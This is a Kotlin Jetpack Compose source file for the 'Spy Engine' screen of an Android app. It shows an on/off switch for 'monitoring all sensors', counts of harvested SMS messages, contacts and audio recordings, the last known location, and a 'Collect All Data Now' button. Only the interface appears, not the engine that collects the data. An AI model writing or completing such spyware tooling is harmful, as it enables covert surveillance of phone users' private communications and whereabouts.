package com.genetic.system.v3.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.genetic.system.v3.engine.SpyEngine
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SpyScreen(navController: NavController) {
    val scope = rememberCoroutineScope()
    val spyEngine = remember { SpyEngine() }
    var isActive by remember { mutableStateOf(false) }
    var logs by remember { mutableStateOf(listOf<String>()) }
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("👁️ Spy Engine", color = Color.White) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = null, tint = Color.White)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF1A1A2E))
            )
        },
        containerColor = Color(0xFF0A0A0F)
    ) { padding ->
        LazyColumn(
            modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF0D0D18))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text("🕵️ Spy Status", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                            Switch(
                                checked = isActive,
                                onCheckedChange = {
                                    isActive = it
                                    if (it) {
                                        scope.launch {
                                            spyEngine.start()
                                            logs = spyEngine.getLogs()
                                        }
                                    } else {
                                        spyEngine.stop()
                                    }
                                },
                                colors = SwitchDefaults.colors(checkedThumbColor = Color.Red)
                            )
                        }
                        Text(
                            if (isActive) "🔴 Active - Monitoring all sensors" else "⚪ Inactive",
                            color = if (isActive) Color.Red else Color.Gray,
                            fontSize = 12.sp
                        )
                    }
                }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF12121E))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("📊 Data Collected", color = Color.Gray, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("SMS:", color = Color.Gray, fontSize = 12.sp)
                            Text("${spyEngine.smsCount}", color = Color.White, fontSize = 12.sp)
                        }
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("Contacts:", color = Color.Gray, fontSize = 12.sp)
                            Text("${spyEngine.contactCount}", color = Color.White, fontSize = 12.sp)
                        }
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("Location:", color = Color.Gray, fontSize = 12.sp)
                            Text(spyEngine.lastLocation, color = Color(0xFF4ECDC4), fontSize = 12.sp)
                        }
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("Audio:", color = Color.Gray, fontSize = 12.sp)
                            Text("${spyEngine.audioCount} recordings", color = Color.White, fontSize = 12.sp)
                        }
                    }
                }
            }
            item {
                Button(
                    onClick = {
                        scope.launch {
                            spyEngine.collectAllData()
                            logs = spyEngine.getLogs()
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6200EE)),
                    enabled = isActive
                ) { Text("📥 Collect All Data Now") }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF0A0A15))
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Text("📝 Logs", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        logs.forEach { log ->
                            Text("• $log", color = Color.White.copy(alpha = 0.7f), fontSize = 11.sp,
                                 modifier = Modifier.padding(vertical = 2.dp))
                        }
                    }
                }
            }
        }
    }
}
